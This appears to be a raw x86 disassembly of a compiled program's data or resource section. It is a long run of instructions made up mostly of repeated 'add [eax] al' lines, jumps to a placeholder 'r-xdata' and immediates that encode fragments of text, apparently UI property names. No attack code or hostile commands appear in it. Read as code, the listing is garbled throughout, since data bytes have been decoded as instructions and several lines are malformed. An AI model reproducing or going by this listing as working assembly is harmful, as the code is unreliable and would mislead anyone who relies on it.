add [ eax ] al
add [ eax ] al
jb r-xdata
je r-xdata
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x48004449 ] ch
inc esp
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ ecx + edx * 2 + 0x44 ] dl
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbaf4 ] ch
cmovne eax [ eax ]
js r-xdata
insb
jae r-xdata
add [ ecx ] cl
inc edx
jbe r-xdata
push ebp
jo r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push 0x68ff0002
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
or al 0x41
jne r-xdata
inc esp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
adc al 0x44
add [ esp + edx ] al
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ ebx + ecx * 8 ] al
popad
bound ebp [ ebp + 0x8 ]
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ edx ] bl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
sub al 0x14
inc esp
add [ edx ] cl
arpl [ ebx + 0x44 ] si
jb r-xdata
add [ edx + 0x11380044 ] dl
add [ ebp + 0x12940040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
adc al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edx + 0x13f40044 ] ah
inc esp
add [ edx + eax ] ah
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
cwde
xchg edi eax
inc esp
add [ edx + 0x1 ] ah
add bh bh
je r-xdata
dec ecx
outsb
outsb
outsd
inc esp
jb r-xdata
insb
outsd
inc ebx
outsd
insd
jo r-xdata
add [ ebx + ecx * 8 ] al
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc ebx
je r-xdata

inc esp
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
dec eax
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
inc esp
imul ecx [ ebp + 0x6f ] 0x10186564
inc esp
add [ edx + eax ] dh
insb
dec edi
jne r-xdata
add [ eax ] al
insb
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + 0x65 ] eax
jbe r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
add [ edx ] cl
inc edx
jbe r-xdata
xchg edi eax
inc esp
add [ ebp + 0x1 ] ah
add bh bh
movsb [ edi ] [ esi ]
dec ebx
inc ebp
jo r-xdata
or al 0x0
or al 0x41
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
xchg esi eax
inc esp
add [ ebx + 0x1 ] ah
add bh bh
xor [ ebx + 0x45 ] cl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ edi ] cl
add [ edx ] cl
inc edx
jbe r-xdata
jbe r-xdata
je r-xdata
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add al al
push edi
inc esp
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + 0x63 ] ah
inc esp
add [ eax - 0x7 ] dh
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add al bh
pop eax
inc esp
add [ edi + ecx + 0x595c0045 ] ah
inc esp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ ebx + ecx * 2 ] ah
inc esp
add [ edx + ebx * 2 + 0x3e300044 ] bl
inc ebp
cmp [ esi ] cl
insb
jae r-xdata
outsd
ja r-xdata
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
push esp
jb r-xdata
jmp [ esi + ecx * 2 + 0x44 ]
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
jb r-xdata
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
inc ebp
jae r-xdata
insb
inc edx
outsd
ja r-xdata
push cs
add [ edx ] cl
add [ eax ] dl
inc eax
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4416d4c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
pop ss
inc esp
add [ eax - 0x5ffffffe ] bl
adc al 0x44
add [ eax ] bh
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
add [ eax ] al
dec eax
adc al [ eax + eax + 0x38 ]
or [ ebx + 0x73 ] ah
push ebx
imul ebp [ ebp + 0x70 ] 0x630e656c
jae r-xdata
add bh bh
mov [ ecx ] al
inc ebx
outsd
jne r-xdata
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp + 0x5cff0001 ] ah
aas
inc ebp
add [ eax + 0x453f ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050018 ] al
je r-xdata
popad
jae r-xdata
0x44
adc al [ eax ]
add eax 0x6c797453
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
adc al 0x44
add [ esi + 0x2 ] dh
add bh bh
sbb [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] dl
inc eax
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410b00
je r-xdata
add [ eax ] al
add [ eax ] cl
jb r-xdata
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40105474
add ah cl
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
pop es
dec ecx
insd
dec esi
popad
insd
push esp
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
je r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
or [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] al
push esp
xor eax [ eax + edi * 4 - 0x80 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
inc esp
mov eax 0x7a004480
add [ eax ] al
add al 0x20
inc edx
add [ eax ] dh
add bh bh
aam 0xd7
inc esp
add al dh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
push [ eax ]
dec ebx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] dl
insb
inc ebx
inc edx
add [ eax - 0x6bffbfcd ] bh
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edx ] cl
outsb
je r-xdata
adc [ eax ] al
push eax
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] eax
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] 0x0
add [ eax + 0x42080014 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
adc [ eax + eax + 0x74 ] al
add al [ eax ]
mov [ eax + eax + 0x74 ] al
add [ eax ] al
dec [ eax ]
sti
inc esp
add [ ecx ] al
push ss
inc esp
add [ eax + 0x16 ] ah
inc esp
add [ eax ] al
add [ eax ] al
outsd
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
jae r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x40 ]
imul ebp [ esi + 0x74 ] r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc [ eax + 0x1004458 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax + 0x34 ] eax
salc
inc esp
add [ esi + edx * 8 + 0x44 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
sbb [ eax + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc eax
jo r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
sbb al 0x0
or eax 0x706f7244
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] 0x0
add [ eax ] al
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc esp
add [ eax ] al
mov [ fs : edi + 0x3fb80044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
push esp
aad 0x44
add [ eax + 0x44f6 ] dh
inc ebp
add [ eax ] bh
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002a ] al
push 0x6948776f
outsb
je r-xdata
add al [ eax ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
imul esi [ ebx + 0x69 ] 0x90656c62
push ebp
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
inc ebx
push 0x65676e61
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
adc [ eax ] al
push eax
popad
jb r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
nop
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
nop
push ebp
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
xor [ eax + eax ] 0xa
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9431e0b
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
mov al [ eax + eax - 0x10 ]
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
adc [ fs : eax + eax - 0x80 ] al
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
jb r-xdata
mov al [ eax + eax - 0x28 ]
add [ eax ] eax
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
cld
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x21
jb r-xdata
outsb
dec ebx
jns r-xdata
adc [ eax + eax - 0x78 ] al
add al [ eax ]
dec [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0040 ] al
outsb
dec ebp
popad
jae r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
insd
nop
push ebp
nop
mov al [ eax + eax - 0x20 ]
add [ eax ] eax
jmp eax
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
outsb
dec edi
adc [ eax + eax - 0x80 ] al
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
nop
push ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
aam 0x44
je r-xdata
xchg esp eax
inc esp
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
je r-xdata
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
inc esp
mov al [ eax + eax - 0x18 ]
add [ eax ] eax
outsb
dec edi
insd
nop
push ebp
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ ecx + ebx + 0x310c0045 ] dl
je r-xdata
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x48004466 ] bh
inc esp
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ edi - 0x68fffbc ] al
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + ebp * 2 + 0x44 ] dh
add [ edi + ecx + 0xdd40045 ] ah
inc ebp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + 0x44 ] bl
add [ eax + 0x4004467 ] al
add [ eax ] bh
mov ebp 0xffef0014
fcos
cld
inc esp
add [ eax + 0x68 ] cl
inc esp
add [ edi ] cl
inc esp
add [ edi + 0x44 ] dl
add [ esi ] cl
push esp
inc edx
jne r-xdata
inc esp
add [ esp + edx * 8 ] bl
inc esp
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x216cc08b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc esp
add [ esi + 0x22 ] dl
inc esp
add [ edx + eax ] cl
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jb r-xdata
inc edx
add al bh
inc esp
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ edx + edx ] ah
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
outsb
push ebx
je r-xdata
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
dec eax
[ eax ]
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x12 ] bl
inc edx
add [ eax - 0x73ffbb3b ] bl
adc al [ edx ]
inc esp
mov [ eax + eax - 0x24 ] 0x11
inc edx
add [ eax + 0x12 ] dh
inc edx
add ah al
adc al [ edx ]
test ah al
inc esp
add [ esi ] bl
inc esp
add al bh
les eax [ eax + eax + 0x70 ]
pushfd
inc ebp
add [ eax ] bh
sti
inc esp
add [ eax - 0x3a ] dh
inc esp
add [ eax * 8 - 0x633fffbc ] ch
inc ebp
add ah dl
pushfd
inc ebp
add [ ebp + eax * 8 + 0x44 ] ah
add ah bh
pushfd
inc ebp
add al al
lds eax [ eax + eax + 0x54 ]
inc sp
add al ah
lds eax [ eax + eax + 0xc ]
popfd
inc ebp
add [ eax - 0x5 ] al
inc esp
add ah dl
mov [ eax + eax + 0x14 ] 0xc7
inc esp
add [ eax ] al
mov [ eax + eax + 0x20 ] 0x9d
inc ebp
add [ ebx * 4 - 0x39dbffbb ] ah
inc esp
add [ ebx + eax * 8 + 0x54110044 ] dl
inc edx
jne r-xdata
inc esp
jb r-xdata
arpl [ gs : esp + edi * 4 - 0x73 ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
inc esp
add [ eax + eax ] ch
add [ eax ] al
cld
nop
and [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec edi
add [ ecx + ecx * 2 ] dh
inc ebp
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ esp + edi * 8 + 0x44 ] ch
outsd
insb
lea eax [ eax ]
insb
and al [ eax + eax + 0x7 ]
push cs
push esp
inc edx
jne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
add [ ecx + esi ] cl
je r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc ebp
je r-xdata
add [ ecx + edx + 0x45 ] bl
outsb
inc ebx
outsd
outsb
je r-xdata
outsd
insb
insb
and [ eax + eax - 0x7c ] eax
fwait
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
inc esp
add [ ebx + ecx * 8 ] al
inc ebx
je r-xdata
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + ebp * 2 + 0x44480044 ] ch
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ edi - 0x68fffbc ] al
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add al al
imul eax [ eax + eax - 0x5c ] 0xfc00450f
imul eax [ eax + eax + 0x54 ] 0x58004513
adc eax [ ebp ]
adc [ edx ] dl
inc ebp
add [ eax + 0x30004511 ] bh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + 0x44 ] bl
add [ eax + 0x38004467 ] al
imul eax [ eax + eax + 0x8 ] 0x6b00500
mov al 0x7
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
insb
jae r-xdata
add [ ebp + 0x22e00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x23e60044 ] dh
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] ah
and [ eax + eax + 0x38 ] eax
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
sub_440a97
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
aam 0x53
inc ecx
add [ ecx + eax ] ch
jmp [ esp + eax * 2 + 0x44 ]
sub_441ab4
push eax
test [ eax + eax ] 0x0
add [ eax + 0x1 ] al
sbb eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
movsb [ edi ] [ esi ]
and al 0x42
add [ eax ] ch
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001e ] al
outsd
outsb
je r-xdata
xchg ebp eax
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
insb
xchg esi eax
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49070020 ] al
insd
dec esi
popad
insd
push esp
adc [ eax ] al
cld
add [ eax ] al
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0021 ] al
je r-xdata
add [ eax ] al
and al 0x0
push cs
push eax
popad
jb r-xdata
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x40105474
add ah cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
add [ edx ] cl
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
je r-xdata
add [ eax ] al
add [ esi ] ah
add [ ebx ] cl
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x40 ]
imul ebp [ esi + 0x74 ] r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
